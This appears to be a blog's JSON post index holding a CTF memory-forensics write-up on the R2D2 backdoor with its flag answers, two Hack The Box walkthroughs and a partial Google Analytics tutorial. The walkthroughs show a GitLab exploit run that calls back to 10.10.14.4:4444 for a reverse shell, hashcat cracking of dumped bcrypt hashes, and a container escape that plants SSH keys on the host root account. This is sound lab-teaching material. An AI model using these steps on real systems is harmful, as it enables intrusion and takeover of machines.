[
  
  {
    "title": "R2D2 Backdoor - Memory Forensics",
    "url": "/posts/CyberConFinals/",
    "categories": "CTF-TIME",
    "tags": "volatility, r2d2 backdoor",
    "date": "2022-11-15 00:00:00 +0800",
    





    
    "snippet": "Hey all and welcome once more to my blog. This past weekend i had the privilege to create a forensics challenge for the CyberCon Finals CTF which was held at USIU University. Top 4 Proffesional tea...",
    "content": "Hey all and welcome once more to my blog. This past weekend i had the privilege to create a forensics challenge for the CyberCon Finals CTF which was held at USIU University. Top 4 Proffesional teams and 10 University teams battled out different challenges ranging from: Web, Forensics, Pwn, Reverse Engineering. Anyway, i didn’t have enough time to properly setup a challenge from scratch, so i resolved to create some questions on a memory sample containing some nasty backdoor i was analyzing sometime back. I was happy to see folks solve most of the challenges and almost comming to the same conclusion i had before. With that said, i will be sharing my thought process on how the challenges were meant to be solved.So, what is a memory dump? Simply put, a memory dump (also known as a core dump or system dump) is a snapshot capture of computer memory data from a specific instant. A memory dump can contain valuable forensics data about the state of the system before an incident such as a crash or security compromise.  Memory forensics can provide unique insights into runtime system activity, including open network connections and recently executed commands or processes. In many cases, critical data pertaining to attacks or threats will exist solely in system memory – examples include network connections, account credentials, chat messages, encryption keys, running processes, injected code fragments, and internet history which is non-cacheable. Any program – malicious or otherwise – must be loaded in memory in order to execute, making memory forensics critical for identifying otherwise obfuscated attacks. ~Source: DigitalGuardianFirst, you unzip the provided memory sample. Password: infectedTo answer the first question, you were only required to get the md5sum of the .vmem file. This was as easy as:➜  md5sum malware.vmemcb47af710c7ab59e43d1396aa7ce950c  malware.vmemMoving on, we can use a tool like volatility to analyze the memory dump.Other tools you can explore on memory forensics include:  Rekall Framework  RedlineFirst, you need to find more information about the dump you are analying such as the image profile to use. To do so, you can use the imageinfo plugin or kdbgscan.➜  python2 vol.py -f malware.vmem imageinfoVolatility Foundation Volatility Framework 2.6.1INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)                     AS Layer2 : FileAddressSpace (/home/kali/Desktop/CyberCON/malware.vmem)                      PAE type : PAE                           DTB : 0x319000L                          KDBG : 0x80544ce0L          Number of Processors : 1     Image Type (Service Pack) : 2                KPCR for CPU 0 : 0xffdff000L             KUSER_SHARED_DATA : 0xffdf0000L           Image date and time : 2011-10-10 17:06:54 UTC+0000     Image local date and time : 2011-10-10 13:06:54 -0400With that determined, you can begin investigating the processes running on the target system by using the pslist plugin.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 pslistVolatility Foundation Volatility Framework 2.6.1Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------0x819cc830 System                    4      0     55      162 ------      00x81945020 smss.exe                536      4      3       21 ------      0 2011-10-10 17:03:56 UTC+00000x816c6020 csrss.exe               608    536     11      355      0      0 2011-10-10 17:03:58 UTC+00000x813a9020 winlogon.exe            632    536     24      533      0      0 2011-10-10 17:03:58 UTC+00000x816da020 services.exe            676    632     16      261      0      0 2011-10-10 17:03:58 UTC+00000x813c4020 lsass.exe               688    632     23      336      0      0 2011-10-10 17:03:58 UTC+00000x81772ca8 vmacthlp.exe            832    676      1       24      0      0 2011-10-10 17:03:59 UTC+00000x8167e9d0 svchost.exe             848    676     20      194      0      0 2011-10-10 17:03:59 UTC+00000x817757f0 svchost.exe             916    676      9      217      0      0 2011-10-10 17:03:59 UTC+00000x816c6da0 svchost.exe             964    676     63     1058      0      0 2011-10-10 17:03:59 UTC+00000x815daca8 svchost.exe            1020    676      5       58      0      0 2011-10-10 17:03:59 UTC+00000x813aeda0 svchost.exe            1148    676     12      187      0      0 2011-10-10 17:04:00 UTC+00000x817937e0 spoolsv.exe            1260    676     13      140      0      0 2011-10-10 17:04:00 UTC+00000x81754990 VMwareService.e        1444    676      3      145      0      0 2011-10-10 17:04:00 UTC+00000x8136c5a0 alg.exe                1616    676      7       99      0      0 2011-10-10 17:04:01 UTC+00000x815c4da0 wscntfy.exe            1920    964      1       27      0      0 2011-10-10 17:04:39 UTC+00000x813bcda0 explorer.exe           1956   1884     18      322      0      0 2011-10-10 17:04:39 UTC+00000x816d63d0 VMwareTray.exe          184   1956      1       28      0      0 2011-10-10 17:04:41 UTC+00000x8180b478 VMwareUser.exe          192   1956      6       83      0      0 2011-10-10 17:04:41 UTC+00000x818233c8 reader_sl.exe           228   1956      2       26      0      0 2011-10-10 17:04:41 UTC+00000x815e7be0 wuauclt.exe             400    964      8      173      0      0 2011-10-10 17:04:46 UTC+00000x817a34b0 cmd.exe                 544   1956      1       30      0      0 2011-10-10 17:06:42 UTC+0000No process looks suspicious at this point. We can take this a notch higher and use the pstree plugin to print process list as a tree. This would make you understand which process triggered other processes.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 pstreeVolatility Foundation Volatility Framework 2.6.1Name                                                  Pid   PPid   Thds   Hnds Time-------------------------------------------------- ------ ------ ------ ------ ---- 0x819cc830:System                                      4      0     55    162 1970-01-01 00:00:00 UTC+0000. 0x81945020:smss.exe                                 536      4      3     21 2011-10-10 17:03:56 UTC+0000.. 0x816c6020:csrss.exe                               608    536     11    355 2011-10-10 17:03:58 UTC+0000.. 0x813a9020:winlogon.exe                            632    536     24    533 2011-10-10 17:03:58 UTC+0000... 0x816da020:services.exe                           676    632     16    261 2011-10-10 17:03:58 UTC+0000.... 0x817757f0:svchost.exe                           916    676      9    217 2011-10-10 17:03:59 UTC+0000.... 0x81772ca8:vmacthlp.exe                          832    676      1     24 2011-10-10 17:03:59 UTC+0000.... 0x816c6da0:svchost.exe                           964    676     63   1058 2011-10-10 17:03:59 UTC+0000..... 0x815c4da0:wscntfy.exe                         1920    964      1     27 2011-10-10 17:04:39 UTC+0000..... 0x815e7be0:wuauclt.exe                          400    964      8    173 2011-10-10 17:04:46 UTC+0000.... 0x8167e9d0:svchost.exe                           848    676     20    194 2011-10-10 17:03:59 UTC+0000.... 0x81754990:VMwareService.e                      1444    676      3    145 2011-10-10 17:04:00 UTC+0000.... 0x8136c5a0:alg.exe                              1616    676      7     99 2011-10-10 17:04:01 UTC+0000.... 0x813aeda0:svchost.exe                          1148    676     12    187 2011-10-10 17:04:00 UTC+0000.... 0x817937e0:spoolsv.exe                          1260    676     13    140 2011-10-10 17:04:00 UTC+0000.... 0x815daca8:svchost.exe                          1020    676      5     58 2011-10-10 17:03:59 UTC+0000... 0x813c4020:lsass.exe                              688    632     23    336 2011-10-10 17:03:58 UTC+0000 0x813bcda0:explorer.exe                             1956   1884     18    322 2011-10-10 17:04:39 UTC+0000. 0x8180b478:VMwareUser.exe                           192   1956      6     83 2011-10-10 17:04:41 UTC+0000. 0x817a34b0:cmd.exe                                  544   1956      1     30 2011-10-10 17:06:42 UTC+0000. 0x816d63d0:VMwareTray.exe                           184   1956      1     28 2011-10-10 17:04:41 UTC+0000. 0x818233c8:reader_sl.exe                            228   1956      2     26 2011-10-10 17:04:41 UTC+0000At this point we see explorer.exe (PID: 1956) spawning VMwareUser.exe , cmd.exe ( Suspicious) , VMwareTray.exe &amp; reader_sl.exe ( Suspicious). My thinking, The user probably opened a malicious pdf file that spawned cmd and finally Adobe reader to view it. We can use the cmdscan plugin to extract command history as shown:➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 cmdscanVolatility Foundation Volatility Framework 2.6.1**************************************************CommandProcess: csrss.exe Pid: 608CommandHistory: 0x11132d8 Application: cmd.exe Flags: Allocated, ResetCommandCount: 2 LastAdded: 1 LastDisplayed: 1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x4c4Cmd #0 @ 0x4e1eb8: sc query malwarCmd #1 @ 0x11135e8: sc query malwareWe see sc query malware command was executed.  The sc command is used to configure, query, stop, start, delete, and add system services on the Windows command line.In our case, the command seems to be querying a service called malware. The first command entry looks like a typo though.Similar to cmdscan the consoles plugin finds commands that attackers typed into cmd.exe or executed via backdoors. The major advantage to this plugin is it not only prints the commands attackers typed, but it collects the entire screen buffer (input and output). For instance, lets see what output was generated when sc query malware command was executed.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 consolesVolatility Foundation Volatility Framework 2.6.1**************************************************ConsoleProcess: csrss.exe Pid: 608Console: 0x4e2370 CommandHistorySize: 50HistoryBufferCount: 2 HistoryBufferMax: 4OriginalTitle: %SystemRoot%\\system32\\cmd.exeTitle: C:\\WINDOWS\\system32\\cmd.exeAttachedProcess: cmd.exe Pid: 544 Handle: 0x4c4----CommandHistory: 0x1113498 Application: sc.exe Flags:CommandCount: 0 LastAdded: -1 LastDisplayed: -1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x0----CommandHistory: 0x11132d8 Application: cmd.exe Flags: Allocated, ResetCommandCount: 2 LastAdded: 1 LastDisplayed: 1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x4c4Cmd #0 at 0x4e1eb8: sc query malwarCmd #1 at 0x11135e8: sc query malware----Screen 0x4e2a70 X:80 Y:300Dump:Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\Documents and Settings\\Administrator&gt;sc query malwar[SC] EnumQueryServicesStatus:OpenService FAILED 1060:The specified service does not exist as an installed service.C:\\Documents and Settings\\Administrator&gt;sc query malwareSERVICE_NAME: malware        TYPE               : 1  KERNEL_DRIVER        STATE              : 4  RUNNING                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)        WIN32_EXIT_CODE    : 0  (0x0)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x0C:\\Documents and Settings\\Administrator&gt;More information about the service can be queried using the svcscan plugin. This plugin gives more detail to the running processes in the event that the analyst requires additional details such as the display name, binary path, or service type.We see that the service is running. Next thing we can try establish if there were network connections. Using connscan plugin, we see➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 connscanVolatility Foundation Volatility Framework 2.6.1Offset(P)  Local Address             Remote Address            Pid---------- ------------------------- ------------------------- ---0x01a25a50 0.0.0.0:1026              172.16.98.1:6666          1956We can detect listening sockets for any protocol (TCP, UDP, RAW, etc), using the sockets plugin.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 socketsVolatility Foundation Volatility Framework 2.6.1Offset(V)       PID   Port  Proto Protocol        Address         Create Time---------- -------- ------ ------ --------------- --------------- -----------0x8177e3c0     1956   1026      6 TCP             0.0.0.0         2011-10-10 17:04:39 UTC+00000x81596a78      688    500     17 UDP             0.0.0.0         2011-10-10 17:04:00 UTC+00000x8166a008      964   1029     17 UDP             127.0.0.1       2011-10-10 17:04:42 UTC+00000x818ddc08        4    445      6 TCP             0.0.0.0         2011-10-10 17:03:55 UTC+00000x818328d8      916    135      6 TCP             0.0.0.0         2011-10-10 17:03:59 UTC+00000x81687e98     1616   1025      6 TCP             127.0.0.1       2011-10-10 17:04:01 UTC+00000x817517e8      964    123     17 UDP             127.0.0.1       2011-10-10 17:04:00 UTC+00000x81753b20      688      0    255 Reserved        0.0.0.0         2011-10-10 17:04:00 UTC+00000x8174fe98     1148   1900     17 UDP             127.0.0.1       2011-10-10 17:04:41 UTC+00000x81753008      688   4500     17 UDP             0.0.0.0         2011-10-10 17:04:00 UTC+00000x816118d8        4    445     17 UDP             0.0.0.0         2011-10-10 17:03:55 UTC+0000Moving on, there was a question asking about the computer name and OS version. This information can be found using the envars plugin. Typically this will show the number of CPUs installed and the hardware architecture (though the kdbgscan output is a much more reliable source), the process’s current directory, temporary directory, session name, computer name, user name, and various other interesting artifacts.But what really triggered PID 1956? My hypothesis was that the user opened suspicious PDF documents that led to cmd &amp; Adobe reader spawning. We also saw a network connection linked to this process. Using the iehistory plugin we can recover fragments of IE history index.dat cache files. It can find basic accessed links (via FTP or HTTP), redirected links (–REDR), and deleted entries (–LEAK). It applies to any process which loads and uses the wininet.dll library, not just Internet Explorer. Typically that includes Windows Explorer and even malware samples. For more info about the same, you can read this blog postFrom the above, we see two suspicious pdf documents linked to the same process: listener.pdf &amp; Exploit.pdfLets scan for malicious drivers loaded, and moreso any that contains the malware string or name.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 driverscan | grep \"malware\"Volatility Foundation Volatility Framework 2.6.1Offset(P)          #Ptr #Hnd Start                            Size Service Key          Name         Driver Name------------------ ---- ---- ------------------ ------------------ -------------------- ------------ -----------0x0000000001a498b8        3        0 0xf9eb4000     0x1500 malware              malware      \\Driver\\malwareTo extract a kernel driver to a file, use the moddump pluggin. Supply the output directory with -D or –dump-dir=DIR.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 moddump -b 0xf9eb4000 --dump-dir=$PWDVolatility Foundation Volatility Framework 2.6.1Module Base Module Name          Result----------- -------------------- ------0x0f9eb4000 winsys32.sys         OK: driver.f9eb4000.sysWe can get its md5sum and check if its flagged by VT➜  md5sum driver.f9eb4000.sys63270d2354695cabde0baeb0aed60e2a  driver.f9eb4000.sysFrom the VT - driver.f9eb4000.sys Analysis, we find 53/71 vendors flagged this file as malicious. We also learn that it linked with R2D2 backdoor.Running strings on the malicious driver, we find another interesting dll referenced. Doing a quick google search on the same, we still get hits on R2D2 backdoor.Lets find out if the dll is used by explorer.exe. To display a process’s loaded DLLs, use the dlllist plugin with the -p or --pid filter as shown below.From the output shown above, we see mfc42ul.dll has a wierd base address compared to the rest (0x10000000). What we can do is extract the DLL from the process’s memory space and dump it to disk for analysis as shown below:➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 moddump -b 0x10000000 --dump-dir=$PWDVolatility Foundation Volatility Framework 2.6.1Module Base Module Name          Result----------- -------------------- ------0x010000000 UNKNOWN              OK: driver.10000000.sys➜  md5sum driver.10000000.sys4986f678160ccd516f2bd589719ea0c4  driver.10000000.sysDoing a quick check on VirusTotal, we see 46/68 flagged this file as malicious.I did some research on this backdoor and came across this report by the Chaos Computer Club (CCC), a long-established German hacker group that claimed that the German government may have unleashed a backdoor Trojan Horse program, allowing them to spy on its people. While running strings on the suspicious dll (mfc42ul.dll), i noticed some wierd string, C3PO-r2d2-POE. Starwars characters? I don’t know.From CCC’s report, i learnt that the backdoor was dubbed “R2D2” due to the “C3PO-r2d2-POE” string located inside the Trojan. CCC claims that it allows the monitoring Internet activity, including the recording of MSN Messenger conversations, Skype calls and Yahoo messenger chat.That wraps up my analysis of the R2D2 backdoor, atleast for the context of the CTF. Upon completion of my analysis, I stumbled upon several blog posts documenting analysis of the same sample. Please check them out!  Invoke-IR - R2D2 Memory Sample Analysis   ka1d0 - Analyzing Memory Dumps — R2D2 Malware  Skills that matter - Hunting R2D2 Malware  evild3ad - Federal Trojan aka R2D2If anyone has additional details that i might have missed, or has any feedback to improve my methodology it would be greatly appreciated.Questions  What is the md5sum of the memory sample (50pts)ccke{cb47af710c7ab59e43d1396aa7ce950c}  What is the computer name of the machine captured (50pts)ccke{GENERALLEE}  What is the name of the OS from which the memory sample was captured from? (50pts)ccke{Windows_NT}  What process triggered a series of suspicious processes? (50pts)ccke{1956}  What Remote Address and Port was the victim machine communicating with? (50pts)ccke{172.16.98.1:6666}  There are two suspicious PDFs that were likely opened. Can you find their names? (50pts)ccke{listener.pdf,Exploit.pdf}  What is the md5sum of the malicious dll? (300pts)ccke{4986f678160ccd516f2bd589719ea0c4}  What is the md5sum of the malicious driver? (300pts)ccke{63270d2354695cabde0baeb0aed60e2a}  What is the name of this backdoor? (100pts)ccke{R2D2} or ccke{r2d2}"
  },
  
  {
    "title": "Delivery - Hack The Box",
    "url": "/posts/htb-writeup-delivery/",
    "categories": "hackthebox, infosec",
    "tags": "osticket, mysql, mattermost, hashcat, rules",
    "date": "2021-05-22 00:00:00 +0800",
    





    
    "snippet": "Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform ...",
    "content": "Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we’ll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we’ll use hashcat combined with rules to crack the password then get the root shell.PortscanNmap scan report for 10.129.148.141Host is up (0.018s latency).Not shown: 65532 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: |   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)80/tcp   open  http    nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Welcome8065/tcp open  unknown| fingerprint-strings: |   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: |     HTTP/1.1 400 Bad Request|     Content-Type: text/plain; charset=utf-8|     Connection: close|     Request|   GetRequest: |     HTTP/1.0 200 OK|     Accept-Ranges: bytes|     Cache-Control: no-cache, max-age=31556926, public|     Content-Length: 3108|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com|     Content-Type: text/html; charset=utf-8|     Last-Modified: Sun, 09 May 2021 00:00:02 GMT|     X-Frame-Options: SAMEORIGIN|     X-Request-Id: fqrpd5m3ftgnzmxkbieezqadxo|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false|     Date: Sun, 09 May 2021 00:01:31 GMT|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\"&gt;&lt;meta name=\"robots\" content=\"noindex, nofollow\"&gt;&lt;meta name=\"referrer\" content=\"no-referrer\"&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name=\"mobile-web-app-capable\" content=\"yes\"&gt;&lt;meta name=\"application-name\" content=\"Mattermost\"&gt;&lt;meta name=\"format-detection\" content=\"telephone=no\"&gt;&lt;link re|   HTTPOptions: |     HTTP/1.0 405 Method Not Allowed|     Date: Sun, 09 May 2021 00:01:31 GMT|_    Content-Length: 0WebsiteThe Delivery website is pretty basic, there’s a link to a vhost called helpdesk.delivery.htb and a contact us section. We’ll add this entry to our local host before proceeding further.The contact us section tells us we need an @delivery.htb email address and tells us port 8065 is a MatterMost server. MatterMost is a Slack-like collaboration platform that can be self-hosted.Browsing to port 8065 we get the MatterMost login page but we don’t have credentials yetHelpdeskThe Helpdesk page uses the OsTicket web application. It allows users to create and view the status of ticket.We can still open new tickets even if we only have a guest user.After a ticket has been created, the system generates a random @delivery.htb email account with the ticket ID.Now that we have an email account we can create a MatterMost account.A confirmation email is then sent to our ticket status inbox.We use the check ticket function on the OsTicket application and submit the original email address we used when creating the ticket and the ticket ID.We’re now logged in and we see that the MatterMost confirmation email has been added to the ticket information.To confirm the creation of our account we’ll just copy/paste the included link into a browser new tab.After logging in to MatterMost we have access to the Internal channel where we see that credentials have been posted. There’s also a hint that we’ll have to use a variation of the PleaseSubscribe! password later.User shellWith the maildeliverer / Youve_G0t_Mail! credentials we can SSH in and get the user flag.Credentials in MySQL databaseAfter doing some recon we find the MatterMost installation directory in /opt/mattermost:maildeliverer@Delivery:/opt/mattermost/config$ ps waux | grep -i mattermostmatterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost/bin/mattermostThe config.json file contains the password for the MySQL database:[...]\"SqlSettings\": {        \"DriverName\": \"mysql\",        \"DataSource\": \"mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\",[...]We’ll connect to the database server and poke around.maildeliverer@Delivery:/$ mysql -u mmuser --password='Crack_The_MM_Admin_PW'Welcome to the MariaDB monitor.  Commands end with ; or \\g.Your MariaDB connection id is 91Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mattermost         |+--------------------+MatterMost user accounts are stored in the Users table and hashed with bcrypt. We’ll save the hashes then try to crack them offline.MariaDB [(none)]&gt; use mattermost;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mattermost]&gt; select Username,Password from Users;+----------------------------------+--------------------------------------------------------------+| Username                         | Password                                                     |+----------------------------------+--------------------------------------------------------------+| surveybot                        |                                                              || c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK || 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G || root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO || snowscan                         | $2a$10$spHk8ZGr54VWf4kNER/IReO.I63YH9d7WaYp9wjiRswDMR.P/Q9aa || ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq || channelexport                    |                                                              || 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |+----------------------------------+--------------------------------------------------------------+8 rows in set (0.002 sec)Cracking with rulesThere was a hint earlier that some variation of PleaseSubscribe! is used.I’ll use hashcat for this and since I don’t know the hash ID for bcrypt by heart I can find it in the help.C:\\bin\\hashcat&gt;hashcat --help | findstr bcrypt   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating SystemMy go-to rules is normally one of those two ruleset:  https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule  https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.ruleThese will perform all sort of transformations on the wordlist and we can quickly crack the password: PleaseSubscribe!21C:\\bin\\hashcat&gt;hashcat -a 0 -m 3200 -w 3 -O -r rules\\_NSAKEY.v2.dive.rule hash.txt wordlist.txt[...]$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21Session..........: hashcatStatus...........: CrackedHash.Name........: bcrypt $2*$, Blowfish (Unix)[...]The root password from MatterMost is the same as the local root password so we can just su to root and get the system flag."
  },
  
  {
    "title": "Ready - Hack The Box",
    "url": "/posts/htb-writeup-ready/",
    "categories": "hackthebox, infosec",
    "tags": "linux, gitlab, cve, docker, privileged container",
    "date": "2021-05-15 00:00:00 +0800",
    





    
    "snippet": "Ready was a pretty straighforward box to get an initial shell on: We identify that’s it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once in...",
    "content": "Ready was a pretty straighforward box to get an initial shell on: We identify that’s it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we’re in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory.Portscansudo nmap -T4 -sC -sV -oA scan -p- 10.129.149.31Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 22:41 EDTNmap scan report for 10.129.149.31Host is up (0.015s latency).Not shown: 65533 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)5080/tcp open  http    nginx| http-robots.txt: 53 disallowed entries (15 shown)| / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit| http-title: Sign in \\xC2\\xB7 GitLab|_Requested resource was http://10.129.149.31:5080/users/sign_in|_http-trane-info: Problem with XML parsing of /evox/aboutGitlabThe webserver on port 5080 runs a Gitlab instance.We have access to create a new account.Once logged in, we see in the projects list there’s a single projet called ready-channel.To check the Gitlab version we go to the Help section and we can see it’s running 11.4.7.A quick search on Exploit-DB shows there’s an authenticated remote code execution vulnerability for this exact version.python3 exploit.py -g http://10.129.149.31 -u snowscan2 -p yolo1234 -l 10.10.14.4 -P 4444Reverse shell connection:PrivescBy running linpeas.sh we find a backup file with some SMTP credentials for the gitlab application.Found /opt/backup/gitlab.rbgitlab_rails['smtp_password'] = \"wW59U!ZKMbG9+*#h\"That password is the same password as the root password for the container so we can privesc locally inside the container.git@gitlab:/opt/backup$ su -l rootsu -l rootPassword: wW59U!ZKMbG9+*#hroot@gitlab:~# There’s a root_pass file in the root of the filesystem but that’s not useful.cat /root_passYG65407Bjqvv9A0a8Tm_7wIf we look at the /opt/backup/docker-compose.yml configuration file, we can see it’s a hint that we’re running in a privileged container:    volumes:      - './srv/gitlab/config:/etc/gitlab'      - './srv/gitlab/logs:/var/log/gitlab'      - './srv/gitlab/data:/var/opt/gitlab'      - './root_pass:/root_pass'    privileged: true    restart: unless-stopped    #mem_limit: 1024mPrivileged containers can access the host’s disk devices so we can just read the root flag after mounting the drive.To get a proper shell in the host OS we can drop our SSH keys in the root’s .ssh directory.root@gitlab:~# mount /dev/sda2 /mntmount /dev/sda2 /mntroot@gitlab:~# echo 'ssh-rsa AAAAB3NzaC1y[...]+HUBS+l32faXPc= snowscan@kali' &gt; /mnt/root/.ssh/authorized_keys[...]$ ssh root@10.129.150.37The authenticity of host '10.129.150.37 (10.129.150.37)' can't be established.ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.129.150.37' (ECDSA) to the list of known hosts.Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)[...]The list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Thu Feb 11 14:28:18 2021root@ready:~# cat root.txtb7f98681505cd39066f67147b103c2b3"
  },
  
  {
    "title": "Enable Google Page Views",
    "url": "/posts/enable-google-pv/",
    "categories": "Blogging, Tutorial",
    "tags": "google analytics, pageviews",
    "date": "2021-01-04 07:32:00 +0800",
    





    
    "snippet": "  The content of this post applies only to Universal Analytics property (UA), not Google Analytics 4 (GA 4). In addition, since UA is about to be deprecated on Jul 1, 2023, the Page Views feature o...",
    "content": "  The content of this post applies only to Universal Analytics property (UA), not Google Analytics 4 (GA 4). In addition, since UA is about to be deprecated on Jul 1, 2023, the Page Views feature of Chirpy will also be deprecated at that time.This post is to enable Page Views on the Chirpy theme based blog that you just built. This requires technical knowledge and it’s recommended to keep the google_analytics.pv.* empty unless you have a good reason. If your website has low traffic, the page views count would discourage you to write more blogs. With that said, let’s start with the setup.Set up Google AnalyticsCreate GA account and propertyFirst, you need to set up your account on Google analytics. While you create your account, you must create your first Property as well.  Head to https://analytics.google.com/ and click on Start Measuring  Enter your desired Account Name and choose the desired checkboxes  Enter your desired Property Name. This is the name of the tracker project that appears on your Google Analytics dashboard  Enter the required information About your business  Hit Create and accept any license popup to set up your Google Analytics account and create your propertyCreate Data StreamWith your property created, you now need to set up Data Stream to track your blog traffic. After you signup, the prompt should automatically take you to create your first Data Stream. If not, follow these steps:  Go to Admin on the left column  Select the desired property from the drop-down on the second column  Click on Data Streams  Add a stream and click on Web  Enter your blog’s URLIt should look like this:Now, click on the new data stream and grab the Measurement ID. It should look something like G-V6XXXXXXXX. Copy this to your _config.yml file:google_analytics:  id: 'G-V6XXXXXXX'   # fill in your Google Analytics ID  # Google Analytics pageviews report settings  pv:    proxy_endpoint:   # fill in the Google Analytics superProxy endpoint of Google App Engine    cache_path:       # the local PV cache data, friendly to visitors from GFW regionWhen you push these changes to your blog, you should start seeing the traffic on your Google Analytics. Play around with the Google Analytics dashboard to get familiar with the options available as it takes like 5 mins to pick up your changes. You should now be able to monitor your traffic in real time.Setup Page ViewsThere is a detailed tutorial available to set up Google Analytics superProxy. But, if you are interested to just quickly get your Chirpy-based blog display page views, follow along. These steps were tested on a Linux machine. If you are running Windows, you can use the Git bash terminal to run Unix-like commands.Setup Google App Engine      Visit https://console.cloud.google.com/appengine        Click on Create Application        Click on Create Project        Enter the name and choose the data center close to you        Select Python language and Standard environment        Enable billing account. Yeah, you have to link your credit card. But, you won’t be billed unless you exceed your free quota. For a simple blog, the free quota is more than sufficient.        Go to your App Engine dashboard on your browser and select API &amp; Services from the left navigation menu        Click on Enable APIs and Services button on the top        Enable the following APIs: Google Analytics API        On the left, Click on OAuth Consent Screen and accept Configure Consent Screen. Select External since your blog is probably hosted for the public. Click on Publish under Publishing Status        Click on Credentials on the left and create a new OAuth Client IDs credential. Make sure to add an entry under Authorized redirect URIs that matches: https://&lt;project-id&gt;.&lt;region&gt;.r.appspot.com/admin/auth        Note down the Your Client ID and Your Client Secret. You’ll need this in the next section.        Download and install the cloud SDK for your platform: https://cloud.google.com/sdk/docs/quickstart        Run the following commands:    